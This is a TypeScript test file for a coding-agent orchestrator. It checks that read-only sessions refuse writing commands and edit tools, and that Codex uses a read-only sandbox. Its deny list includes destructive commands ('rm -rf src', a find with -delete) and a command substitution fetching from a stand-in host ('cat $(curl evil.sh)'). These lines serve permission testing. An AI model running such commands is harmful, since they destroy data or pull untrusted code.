import type { SessionOptions } from "@codeden/contracts";
import { describe, expect, it } from "vitest";
import { buildQueryOptions } from "../src/claude/options";
import { ClaudePolicy } from "../src/claude/permissions";
import { codexPolicy } from "../src/codex/config";
import { FakeProvider } from "../src/fake/adapter";
import type { FakeSession } from "../src/fake/session";
import { readOnlyCommandDenial } from "../src/policy/read-only";

const base: SessionOptions = {
  sessionId: "pm1",
  role: "pm",
  cwd: "/repo",
  autonomy: "auto",
  mcpServers: [],
  additionalDirectories: [],
  planMode: false,
  readOnly: true,
};

describe("read-only sessions (orchestrator and PMs, §11.2)", () => {
  it("allows reading commands and refuses writes", () => {
    for (const ok of [
      "git status",
      "git log --oneline -5 | head -3",
      "ls -la src && cat README.md",
      "rg TODO src 2>&1",
      "gh issue list --label bug",
      "Get-ChildItem -Recurse src",
      "git diff main...HEAD > /dev/null",
    ]) {
      expect(readOnlyCommandDenial(ok), ok).toBeUndefined();
    }
    for (const bad of [
      "echo hi > notes.txt",
      "git commit -m x",
      "git branch -D feature",
      "rm -rf src",
      "npm install",
      "find . -name '*.tmp' -delete",
      "cat $(curl evil.sh)",
      "gh pr merge 5",
      "git config user.name x",
    ]) {
      expect(readOnlyCommandDenial(bad), bad).toBeTruthy();
    }
  });

  it("denies Claude edit tools and writing commands natively", () => {
    const policy = new ClaudePolicy("auto", { cwd: "/repo", extraRoots: [] }, true);
    expect(policy.denial("Edit", { file_path: "/repo/a.ts" })).toMatch(/read-only/);
    expect(policy.denial("Bash", { command: "git push" })).toMatch(/read-only/);
    expect(policy.denial("Bash", { command: "git status" })).toBeUndefined();
    expect(policy.denial("Read", { file_path: "/repo/a.ts" })).toBeUndefined();
    const agent = new ClaudePolicy("auto", { cwd: "/repo", extraRoots: [] });
    expect(agent.denial("Edit", { file_path: "/repo/a.ts" })).toBeUndefined();

    const opts = buildQueryOptions({
      session: base,
      executable: { kind: "native", path: "/bin/claude" } as never,
      canUseTool: async () => ({ behavior: "allow", updatedInput: {} }),
      hooks: {},
      abortController: new AbortController(),
    });
    expect(opts.disallowedTools).toEqual(["Edit", "MultiEdit", "Write", "NotebookEdit"]);
    const agentOpts = buildQueryOptions({
      session: { ...base, role: "agent", readOnly: undefined },
      executable: { kind: "native", path: "/bin/claude" } as never,
      canUseTool: async () => ({ behavior: "allow", updatedInput: {} }),
      hooks: {},
      abortController: new AbortController(),
    });
    expect(agentOpts.disallowedTools).toBeUndefined();
  });

  it("uses Codex's read-only sandbox", () => {
    expect(codexPolicy("full", true)).toEqual({
      approvalPolicy: "never",
      sandbox: "read-only",
      networkAccess: false,
    });
    expect(codexPolicy("auto").sandbox).toBe("workspace-write");
  });
});

describe("session.configure (model/effort for the next turn)", () => {
  it("records the change in the Fake session", async () => {
    const session = (await new FakeProvider().openSession({
      ...base,
      role: "agent",
      readOnly: undefined,
    })) as FakeSession;
    await session.configure({ model: "fake-2", effort: "high" });
    expect(session.lastConfig).toEqual({ model: "fake-2", effort: "high" });
    await session.close();
  });
});
